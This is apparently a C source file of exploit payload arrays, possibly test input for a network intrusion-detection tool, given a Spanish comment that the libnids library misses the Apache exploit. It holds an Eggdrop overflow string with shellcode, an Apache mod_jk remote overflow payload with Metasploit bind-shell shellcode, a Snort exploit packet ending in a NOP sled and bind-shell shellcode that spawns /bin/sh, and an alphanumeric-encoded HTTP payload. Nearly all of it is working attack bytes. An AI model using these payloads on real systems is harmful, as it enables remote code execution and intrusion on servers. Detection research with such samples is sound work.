char *eggdrop_32bits = 
"\x3a\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\xb9\xf7\xff"
"\xbf\x20\x50\x52\x49\x56\x4d\x53\x47\x20\x4c\x61\x6d\x65\x73\x74"
"\x62\x30\x74\x20\x3a\x74\x65\x73\x74\xbf\x1a\x2f\xf0\x55\xdb\xc9"
"\xd9\x74\x24\xf4\x5b\x31\xc9\xb1\x13\x31\x7b\x12\x83\xeb\xfc\x03"
"\x61\x21\x12\xa0\xa4\xe6\x81\x08\x95\x72\x24\xe5\x7f\xdb\xa1\x18"
"\xb2\x5b\x22\x83\xfc\x63\x88\xb4\xb5\xe2\xeb\xee\x1f\x7d\x06\x11"
"\x9f\x87\x70\x79\x8e\x2b\x3e\x1f\xe3\x5a\x21\x6f\x65\x0d\xf3\xc3"
"\xe0\x4c\xb0\x2e\x72\xdc\x5f\x9e\x5d\x92\xf7\x88\x8e\x36\x61\x27"
"\x59\x55\x23\xe4\xd0\x7b\x74\x01\x2f\xfb\x75\x16\x0a\x00"
;

int size_eggdrop_32bits = 494;

/* ESTE EXPLOIT DE APACHE NO LO PILLA BIEN LA LIBRERIA LIBNIDS 
 * **
 * ** Fedora Core 5,6 (exec-shield) based
 * ** Apache Tomcat Connector (mod_jk) remote overflow exploit
 * ** by Xpl017Elz
 * **
 * ** Advanced exploitation in exec-shield (Fedora Core case study)
 * ** URL: http://x82.inetcop.org/h0me/papers/FC_exploit/FC_exploit.txt
 * **
 * ** Reference: http://www.securityfocus.com/bid/22791
 * ** vendor: http://tomcat.apache.org/
 * **
 * ** eliteboy's exploit (SUSE, Debian, FreeBSD):
 * ** http://www.milw0rm.com/exploits/4093
 * **
 * ** Nicob <nicob[at]nicob.net>'s exploit (Win32):
 * ** http://downloads.securityfocus.com/vulnerabilities/exploits/apache_modjk_overflow.rb
 * **
 * ** --
 * ** exploit by "you dong-hun"(Xpl017Elz), <szoahc@hotmail.com>.
 * ** My World: http://x82.inetcop.org
 * **
char library_shellcode[]=
        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
         linux_ia32_bind -  LPORT=8282 Size=108 Encoder=PexFnstenvSub http://metasploit.com 
        "\x33\xc9\x83\xe9\xeb\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xe0"
        "\x2c\x54\x7f\x83\xeb\xfc\xe2\xf4\xd1\xf7\x07\x3c\xb3\x46\x56\x15"
        "\x86\x74\xcd\xf6\x01\xe1\xd4\xe9\xa3\x7e\x32\x17\xc0\x76\x32\x2c"
        "\x69\xcd\x3e\x19\xb8\x7c\x05\x29\x69\xcd\x99\xff\x50\x4a\x85\x9c"
        "\x2d\xac\x06\x2d\xb6\x6f\xdd\x9e\x50\x4a\x99\xff\x73\x46\x56\x26"
        "\x50\x13\x99\xff\xa9\x55\xad\xcf\xeb\x7e\x3c\x50\xcf\x5f\x3c\x17"
        "\xcf\x4e\x3d\x11\x69\xcf\x06\x2c\x69\xcd\x99\xff";

 * */
char *apache_32bits =
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\xc4\x25\x30\x64\x06\x08\xbc\x74\x04\x08\x82\x82"
"\x82\x82\x14\x80\x04\x08\xc7\x25\x30\x64\x06\x08\xc7\x25\x30\x64"
"\x06\x08\xc7\x25\x30\x64\x06\x08\x80\x25\x30\x63\x06\x08\xc7\x25"
"\x30\x64\x06\x08\x04\x01\x10\x20\x48\x54\x54\x50\x2f\x31\x2e\x30"
"\x0d\x0a\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x33\xc9"
"\x83\xe9\xeb\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xe0\x2c\x54"
"\x7f\x83\xeb\xfc\xe2\xf4\xd1\xf7\x07\x3c\xb3\x46\x56\x15\x86\x74"
"\xcd\xf6\x01\xe1\xd4\xe9\xa3\x7e\x32\x17\xc0\x76\x32\x2c\x69\xcd"
"\x3e\x19\xb8\x7c\x05\x29\x69\xcd\x99\xff\x50\x4a\x85\x9c\x2d\xac"
"\x06\x2d\xb6\x6f\xdd\x9e\x50\x4a\x99\xff\x73\x46\x56\x26\x50\x13"
"\x99\xff\xa9\x55\xad\xcf\xeb\x7e\x3c\x50"
"\x99\xff\x0d\x0a\x48\x6f\x73\x74\x3a\x20\x30\x78\x38\x32\x2d\x61"
"\x70\x61\x63\x68\x65\x2d\x6d\x6f\x64\x5f\x6a\x6b\x2e\x63\x0d\x0a"
"\x0d\x0a"
;

int size_apache_32bits = 268;

char *snort_exploit = 
"\x00\xd0\xc9\xa7\x56\x18\x00\x01\x02\xd9\xc1\x59\x08\x00\x45\x00"
"\x05\x94\x00\x00\x40\x00\x40\x11\xaf\xa3\xc0\xa8\x02\x01\xc0\xa8"
"\x02\x64\x80\x21\x00\x35\x05\x80\x8b\x47\xce\x63\xd1\xd2\x16\xe7"
"\x13\xcf\xd4\x5a\x5a\x79\x4d\x8a\xb4\x66\xaa\xa2\xc8\x75\x23\x09"
"\x78\xb2\xe0\xd4\xef\x49\x8a\x8e\x39\xe5\xaa\x8a\x4d\x0d\x22\xb5"
"\x37\x51\x6e\xc9\x97\x63\x29\xe3\x84\x69\xf3\x17\x74\x30\xf1\x62"
"\x20\xc3\xd5\x01\xa4\x7b\xc0\xa0\xc5\x59\xa5\xd5\x96\xb2\xb0\x4f"
"\xfc\x0b\x67\x49\xd0\x86\x70\xc3\xe6\x5b\x93\xf2\x8c\x0a\x01\x97"
"\x14\x0f\x95\xce\x35\x98\x3a\x88\x2f\xb3\xcd\xbb\xae\x2b\x04\x58"
"\x71\x35\x0f\x1e\x8b\x06\xbe\x6d\x2a\xa8\x84\xbd\x56\xec\xda\x50"
"\x3c\xa1\xa7\x85\x0b\x46\xbe\x2e\xbf\x3c\xa9\xa5\xdd\x80\x85\x5a"
"\xde\x98\xed\x70\xcf\x8c\x3c\xc9\xb7\xf7\x8d\xdf\x3b\x7d\x05\x95"
"\xff\xbf\xf3\x8d\x4e\x6d\x76\x9b\x7c\x1c\xc1\x59\x6a\x58\x3b\x5c"
"\x6a\x7b\x8a\xa8\x43\xdf\xf0\xc0\x97\x10\x36\xa0\x03\x06\xe9\x2e"
"\x87\x52\x82\x4e\xa6\xb6\x4a\x75\xd0\x7a\xbd\xc1\x9e\x1c\xce\x27"
"\xbe\xe7\x6c\x6c\xd1\x48\xc4\x58\x30\x3d\xa7\xa8\xd6\x8e\x6e\x43"
"\x7a\x81\x5a\x50\xfb\x69\x81\xa6\xe1\x7e\xc6\xa3\xc2\x93\xa7\xe1"
"\xa2\x44\x3d\x06\xff\xce\x00\x3a\xac\x84\xc9\x5f\x1b\xbf\xbc\xbc"
"\xa1\xd5\x86\xbb\xd4\x8d\x03\x74\x58\x52\xc3\x49\x1b\x46\xad\x73"
"\xde\xb9\x25\xfc\xb5\x1a\x8a\x4f\xb1\x4d\x03\xcd\xbb\xfe\x9c\x22"
"\xa3\x15\xeb\x17\x1b\xab\xf8\x48\x1d\x1b\x3c\x39\x14\x3c\xe9\x65"
"\x5a\x0e\x0a\x78\xbd\x94\x6c\xde\x07\xa1\xfe\xda\x7f\x15\x35\xdb"
"\xaa\x6a\x13\xac\x96\x6a\x09\x6b\x98\xe4\x7a\x9d\x94\xbe\x61\x00"
"\x7d\xcd\x76\xe0\xde\xe3\xae\x4e\x78\xa8\xe1\x6e\x0c\x8c\x6f\x70"
"\x1c\x5b\x25\x22\xee\x93\xbc\xa4\x11\x32\x04\xfc\x42\x94\x3f\x0a"
"\x90\x1b\xb0\xfe\xdf\xef\x76\xe9\xca\x89\xb4\x72\x6d\x4a\xb3\xca"
"\xe2\xb1\x09\xc1\x2a\x6d\xbc\xfa\xaf\xd0\xa2\xbd\x27\x45\x2b\x6d"
"\xdb\xc3\x41\xd9\x69\x41\x6e\x96\xa7\x6d\x9f\xcc\x49\xf8\x88\x0f"
"\xa4\xb4\x28\x12\x14\x01\x0e\x17\x1b\xe4\xdc\x2a\xeb\xd9\x8b\x0f"
"\x86\x4b\x10\xf9\x84\x81\x1d\xfc\x55\x9b\x2b\x45\x67\xfd\x76\x09"
"\x8a\x6b\x09\x3b\x32\xf7\x1c\xe2\x3d\xf6\xfb\xea\x76\x99\x49\xfa"
"\x39\xdb\x25\xa6\xf8\x77\x0c\x05\xdd\xfc\x3f\x26\xb0\x02\x06\xbe"
"\xfc\x5f\x55\xa6\x4d\xb6\x6d\x83\x7d\xd0\x86\x45\x2f\x2d\x6d\xd4"
"\xdb\x5c\x69\x88\x2c\x69\xa2\xf8\x86\xd7\xe3\xf5\x8c\xef\xbf\xd8"
"\xe1\x57\x52\x19\x6d\xe6\x6a\xc2\x02\xb7\x46\xa3\x40\x9d\x1d\x87"
"\xd6\x16\x42\xe7\x49\x62\xc7\x5d\xfa\x55\x00\xdc\x23\x4b\x29\x5e"
"\xe2\x9c\x8a\x9e\x5a\x91\x1a\x87\x76\xd5\xa2\x6c\x4f\x0f\x03\x5a"
"\x70\x30\x5b\x2b\x18\xe8\x83\x3c\x1f\x9e\x1d\x41\x3d\xdf\xad\x38"
"\x27\x55\xc4\xbb\x9c\xfc\x25\xda\xbf\x52\x22\x08\x25\x8e\x86\xd5"
"\xf2\xd2\xf9\xdc\x1f\xa3\xff\x7d\x5e\xd9\x62\xce\x41\x12\x51\x2e"
"\x18\x8b\x69\xda\x1a\xf2\x13\x43\x26\x56\x4e\xe0\x8a\xa0\x8f\xe0"
"\x84\x06\xa6\x02\x26\x5d\xe2\xe9\xff\x0e\xd8\xca\x78\x8d\xc0\x68"
"\xbd\xa6\x00\x42\x9d\x19\x6d\x0a\x53\xe8\xaf\x7a\x46\xed\x25\xa3"
"\xad\x51\x29\x66\x57\x7b\xb5\xa6\x2a\xa6\x85\xbd\x2a\x57\x7f\xae"
"\x7d\xad\x31\xbb\xcd\x19\xba\x18\x0e\x90\xcc\xff\x20\x3e\x70\xe6"
"\xb6\x7e\xea\x4e\x18\xa8\x1e\x9d\x67\xa9\x74\xae\x9f\xb9\x38\xe8"
"\x82\xc9\x25\x2c\xd2\x9b\x83\x13\x1e\x17\x2d\xf8\xe1\xfb\x38\xb1"
"\x88\xd3\x92\x23\x53\xc9\x27\x76\xfd\x5f\xaa\x67\x3f\x7a\x12\x1e"
"\x72\x21\xc3\x7f\x14\x27\x2e\xe4\x4c\xa5\x7b\xab\x71\xcb\x86\x8c"
"\xc9\x78\x48\x4e\xae\x69\x38\x3a\xf5\x8e\x31\x2f\xf2\x23\x16\xf8"
"\x36\xfe\x93\xbb\x7a\xa4\xa5\xd4\x41\xa1\xfd\xc2\x58\xb7\xa1\xdf"
"\xa1\x96\x14\x55\x52\x2e\xf8\xaf\xb7\xc1\x30\x6e\x7f\xbc\x2a\x7e"
"\x35\x27\xdd\x49\xad\xbb\x10\x49\x23\x34\x5b\x83\x7e\xe7\x92\x32"
"\x7a\x55\x1f\x42\x86\xc0\x6e\x1f\x6b\x1e\x50\x8d\x8f\x6c\xb8\x99"
"\xb9\x25\x2a\xcf\xd5\xd3\x35\x8d\x5a\x25\x1e\x78\x8b\x61\x1f\x6e"
"\x5b\xdc\x10\xfc\x94\xc8\xe5\x11\xb9\x6d\x17\x12\x2a\x5c\x48\x0f"
"\xe8\x1f\x41\xb6\x5a\xb5\x3e\x67\xf0\x1d\xad\xa8\x86\xd0\x72\xd9"
"\x8b\x54\x4f\x6a\xc2\xee\x42\x6c\x68\x58\xef\x06\x18\xd3\x40\x09"
"\x4b\xfe\x8a\x06\x04\xe8\x32\xde\x2b\xc3\xf0\xfa\x38\x9a\x93\xfd"
"\xb3\xc4\xa5\x76\x59\xf9\x8f\x7a\x22\x84\xa0\x51\xc0\x9a\x8a\x70"
"\x0a\xea\x8e\x87\xfa\x75\x1a\x9c\xb4\xa0\x10\x78\x09\x68\x68\xc0"
"\xbb\xb5\x98\x07\xa1\x52\xf4\xa2\x0d\x9c\xb1\xfc\x4c\x58\x2e\xcb"
"\x6d\x4a\xf4\x82\x86\x84\xfd\x88\x73\xdc\xb4\x89\x21\x21\x5b\x4c"
"\xea\xcf\x73\xe5\xc2\xa0\x37\x2c\x91\x45\x4a\x6d\x62\xb6\x52\x61"
"\xdc\x27\xe5\x7d\xce\x3c\xc3\xca\xd0\x5e\x44\xf5\x27\x4e\x14\x67"
"\xca\xb9\xdb\x78\x63\xcc\x62\xe0\xb8\x0a\x73\x4e\xcb\x5c\xa0\x1c"
"\x5e\xa8\x47\x82\x9b\xc6\xd5\x2a\x13\x4e\x88\xa4\xe5\xb6\xb9\x1b"
"\x81\x3b\x5a\xc8\x4e\x7d\xdc\xa6\xc9\x11\x55\xe5\x4f\xf1\x9f\x83"
"\x5c\x16\x84\x77\x75\x29\xd9\xb0\x63\x36\xe9\xaa\x82\x10\xd5\xef"
"\x78\x9e\x77\xbd\x49\x1c\x2e\x92\xe8\x90\x16\xbc\xd5\x1e\xf8\xfd"
"\x1e\x58\x24\x46\x23\xee\xfa\x37\x88\x41\x3e\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xdb\x53\x43"
"\x53\x6a\x02\x6a\x66\x58\x99\x89\xe1\xcd\x80\x96\x43\x52\x66\x68"
"\x7a\x69\x66\x53\x89\xe1\x6a\x66\x58\x50\x51\x56\x89\xe1\xcd\x80"
"\xb0\x66\xd1\xe3\xcd\x80\x52\x52\x56\x43\x89\xe1\xb0\x66\xcd\x80"
"\x93\x6a\x02\x59\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x52\x68\x2f"
"\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80"
"\x00\x00";

int size_snort_exploit = 1442;

char *nops = 
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
;

char xcorehttp2[] = {
0x58, 0x20, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
0x89, 0x13, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, /* hay una indireccion correcta ,89 13                	mov    %edx,(%ebx)*/
0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
0x89, 0x13, 0x90, 0x80, 0x80, 0xee, 0x31, 0xaa, /* hay una indireccion correcta ,89 13                	mov    %edx,(%ebx)*/
0x01, 0x11, 0x53, 0x11, 0x53, 0x12, 0x90, 0x90, /* hay dos indirecciones agrupadas 11 53 12             	adc    %edx,0x12(%ebx) */
0xaa};

char alpha_mixed_32bits[] = {
0x47, 0x45, 0x54, 0x20, 0x2f, 0x73, 0x74, 0x72, 
0x65, 0x61, 0x6d, 0x2f, 0x3f, 0x32, 0x6c, 0x31, 
0x67, 0x55, 0x47, 0x77, 0x62, 0x30, 0x50, 0x38, 
0x49, 0x53, 0x39, 0x31, 0x72, 0x39, 0x4d, 0x42, 
0x64, 0x4a, 0x39, 0x51, 0x38, 0x49, 0x33, 0x34, 
0x69, 0x62, 0x77, 0x78, 0x45, 0x36, 0x6f, 0x56, 
0x45, 0x66, 0x31, 0x37, 0x31, 0x54, 0x41, 0x41, 
0x36, 0x67, 0x4f, 0x49, 0x54, 0x50, 0x69, 0x31, 
0x6e, 0x68, 0x66, 0x73, 0x62, 0x52, 0x42, 0x46, 
0x5a, 0x66, 0x41, 0x67, 0x65, 0x53, 0x55, 0x43, 
0x53, 0x7a, 0x74, 0x53, 0x52, 0x38, 0x59, 0x57, 
0x77, 0x62, 0x62, 0x63, 0x53, 0x34, 0x31, 0x42, 
0x7a, 0x35, 0x65, 0x52, 0x42, 0x58, 0x70, 0x4f, 
0x73, 0x7a, 0x65, 0x66, 0x42, 0x74, 0x70, 0x71, 
0x61, 0x52, 0x41, 0x61, 0x78, 0x6a, 0x43, 0x4f, 
0x53, 0x48, 0x34, 0x67, 0x6c, 0x4f, 0x4b, 0x59, 
0x58, 0x72, 0x74, 0x45, 0x45, 0x48, 0x4b, 0x4e, 
0x41, 0x30, 0x78, 0x33, 0x6d, 0x72, 0x35, 0x46, 
0x59, 0x62, 0x4c, 0x43, 0x75, 0x74, 0x47, 0x73, 
0x47, 0x69, 0x75, 0x34, 0x61, 0x37, 0x35, 0x41, 
0x36, 0x43, 0x77, 0x61, 0x71, 0x30, 0x4a, 0x44, 
0x7a, 0x6b, 0x4c, 0x55, 0x46, 0x6a, 0x35, 0x57, 
0x6f, 0x44, 0x39, 0x47, 0x33, 0x57, 0x6e, 0x71, 
0x54, 0x49, 0x43, 0x4d, 0x38, 0x42, 0x4d, 0x36, 
0x55, 0x55, 0x42, 0x74, 0x76, 0x73, 0x4b, 0x65, 
0x6d, 0x59, 0x38, 0x54, 0x4d, 0x48, 0x51, 0x4a, 
0x4a, 0x77, 0x56, 0x39, 0x4e, 0x38, 0x79, 0x50, 
0x76, 0x4b, 0x31, 0x4f, 0x30, 0x32, 0x6d, 0x78, 
0x42, 0x78, 0x57, 0x4b, 0x41, 0x73, 0x4c, 0x4d, 
0x6f, 0x59, 0x75, 0x48, 0x6a, 0x7a, 0x39, 0x65, 
0x43, 0x74, 0x67, 0x51, 0x67, 0x6a, 0x63, 0x33, 
0x76, 0x75, 0x46, 0x49, 0x52, 0x4b, 0x68, 0x65, 
0x58, 0x54, 0x4d, 0x34, 0x5a, 0x61, 0x58, 0x49, 
0x6b, 0x33, 0x64, 0x53, 0x54, 0x70, 0x64, 0x6b, 
0x59, 0x38, 0x77, 0x75, 0x49, 0x52, 0x54, 0x63, 
0x50, 0x78, 0x4a, 0x56, 0x6a, 0x69, 0x7a, 0x46, 
0x52, 0x59, 0x76, 0x56, 0x67, 0x56, 0x67, 0x57, 
0x54, 0x4a, 0x37, 0x39, 0x52, 0x39, 0x37, 0x59, 
0x54, 0x55, 0x74, 0x55, 0x4e, 0x78, 0x63, 0x47, 
0x46, 0x6b, 0x4e, 0x76, 0x57, 0x70, 0x79, 0x79, 
0x4f, 0x72, 0x32, 0x38, 0x68, 0x51, 0x4a, 0x62, 
0x50, 0x6b, 0x58, 0x57, 0x76, 0x57, 0x4e, 0x4f, 
0x66, 0x5a, 0x54, 0x78, 0x65, 0x68, 0x46, 0x77, 
0x70, 0x42, 0x4e, 0x31, 0x4c, 0x56, 0x33, 0x68, 
0x55, 0x32, 0x65, 0x5a, 0x66, 0x74, 0x42, 0x70, 
0x72, 0x4b, 0x62, 0x73, 0x76, 0x6d, 0x58, 0x74, 
0x4c, 0x50, 0x6c, 0x31, 0x34, 0x4c, 0x64, 0x74, 
0x76, 0x62, 0x78, 0x44, 0x68, 0x49, 0x72, 0x51, 
0x6e, 0x34, 0x49, 0x65, 0x32, 0x33, 0x4a, 0x36, 
0x36, 0x70, 0x64, 0x34, 0x45, 0x4b, 0x43, 0x44, 
0x72, 0x68, 0x61, 0x61, 0x63, 0x77, 0x70, 0x73, 
0x66, 0x4f, 0x43, 0x4c, 0x42, 0x55, 0x39, 0x71, 
0x76, 0x4c, 0x62, 0x70, 0x39, 0x64, 0x64, 0x4a, 
0x71, 0x67, 0x6e, 0x35, 0x66, 0x54, 0x63, 0x32, 
0x50, 0x4e, 0x76, 0x79, 0x6b, 0x74, 0x6a, 0x53, 
0x58, 0x32, 0x65, 0x71, 0x6b, 0x50, 0x62, 0x4a, 
0x46, 0x56, 0x6d, 0x6f, 0x64, 0x32, 0x30, 0x33, 
0x51, 0x38, 0x72, 0x56, 0x35, 0x43, 0x59, 0x45, 
0x43, 0x34, 0x6b, 0x39, 0x41, 0x75, 0x55, 0x4c, 
0x49, 0x36, 0x6a, 0x6f, 0x79, 0x49, 0x4b, 0x49, 
0x76, 0x35, 0x30, 0x37, 0x62, 0x4b, 0x48, 0x37, 
0x61, 0x43, 0x33, 0x79, 0x31, 0x53, 0x58, 0x61, 
0x62, 0x6c, 0x36, 0x42, 0x4a, 0x53, 0x46, 0x6d, 
0x48, 0x73, 0x4a, 0x76, 0x78, 0x63, 0x59, 0x77, 
0x52, 0x32, 0x47, 0x78, 0x45, 0x52, 0x53, 0x57, 
0x76, 0x36, 0x37, 0x71, 0x6d, 0x55, 0x6a, 0x34, 
0x43, 0x46, 0x52, 0x6f, 0x54, 0x7a, 0x7a, 0x38, 
0x33, 0x6d, 0x43, 0x76, 0x4b, 0x67, 0x45, 0x47, 
0x49, 0x70, 0x44, 0x38, 0x68, 0x52, 0x67, 0x35, 
0x70, 0x46, 0x77, 0x46, 0x6f, 0x72, 0x4b, 0x58, 
0x48, 0x58, 0x4d, 0x4f, 0x67, 0x65, 0x34, 0x44, 
0x66, 0x32, 0x67, 0x56, 0x35, 0x38, 0x5a, 0x74, 
0x4e, 0x64, 0x37, 0x44, 0x6f, 0x47, 0x49, 0x4d, 
0x76, 0x42, 0x72, 0x65, 0x32, 0x4e, 0x49, 0x35, 
0x43, 0x42, 0x65, 0x41, 0x6f, 0x58, 0x54, 0x61, 
0x67, 0x5a, 0x37, 0x55, 0x32, 0x38, 0x6c, 0x75, 
0x45, 0x47, 0x52, 0x42, 0x62, 0x4a, 0x39, 0x6d, 
0x36, 0x4f, 0x57, 0x52, 0x69, 0x6e, 0x4c, 0x77, 
0x45, 0x79, 0x55, 0x69, 0x7a, 0x4a, 0x32, 0x6d, 
0x7a, 0x6f, 0x6c, 0x34, 0x44, 0x30, 0x4a, 0x4c, 
0x52, 0x70, 0x74, 0x73, 0x7a, 0x6b, 0x49, 0x30, 
0x4d, 0x38, 0x74, 0x66, 0x43, 0x4e, 0x32, 0x7a, 
0x78, 0x59, 0x6b, 0x6c, 0x62, 0x79, 0x75, 0x55, 
0x34, 0x76, 0x4d, 0x7a, 0x71, 0x5a, 0x63, 0x4e, 
0x69, 0x4d, 0x68, 0x34, 0x46, 0x49, 0x6b, 0x47, 
0x74, 0x4d, 0x33, 0x79, 0x65, 0x43, 0x78, 0x66, 
0x69, 0x44, 0x71, 0x6c, 0x36, 0x4a, 0x30, 0x38, 
0x71, 0x6b, 0x6b, 0x52, 0x76, 0x44, 0x47, 0x53, 
0x6d, 0x52, 0x46, 0x68, 0x4d, 0x58, 0x59, 0x66, 
